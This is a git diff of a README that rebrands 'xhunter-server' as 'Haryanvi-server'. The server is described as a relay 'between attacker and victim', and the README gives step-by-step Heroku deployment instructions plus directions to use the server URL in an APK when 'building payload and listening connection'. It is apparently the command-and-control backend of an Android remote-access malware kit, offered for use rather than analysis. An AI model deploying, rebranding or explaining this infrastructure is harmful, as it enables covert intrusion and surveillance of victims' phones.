@@ -1,14 +1,14 @@
-# xhunter-server
+# Haryanvi-server
 
-xhunter-server is used to communicate between attacker and victim. It is very easy to host on [heroku](https://www.heroku.com/). follow the below steps:
+Haryanvi-server is used to communicate between attacker and victim. It is very easy to host on [heroku](https://www.heroku.com/). follow the below steps:
 
 #### Setup
 - Signup and create a heroku account [here](https://signup.heroku.com)
 - After login, click the below **Deploy** button.
 
-   [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/anirudhmalik/xhunter-server)
+   [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/haryanvi-developer/Haryanvi-server)
  
  - Give your app a name `<your_app_name>` and click `Deploy app` button.
  - Wait for the process to complete. 
- - Once complete, Click `view app` and If you see `Welcome to Xhunter Backend Server!!` then you have successfully created your server.
- - Now use this url `https://<your_app_name>.herokuapp.com` in [xhunter_v1.5.apk](https://github.com/anirudhmalik/xhunter/releases/tag/v1.5). during building payload and listening connection.
+ - Once complete, Click `view app` and If you see `Welcome to Haryanvi Backend Server!!` then you have successfully created your server.
+ - Now use this url `https://<your_app_name>.herokuapp.com` in [Haryanvi_v1.5.apk](https://github.com/anirudhmalik/Haryanvi/releases/tag/v1.5). during building payload and listening connection.
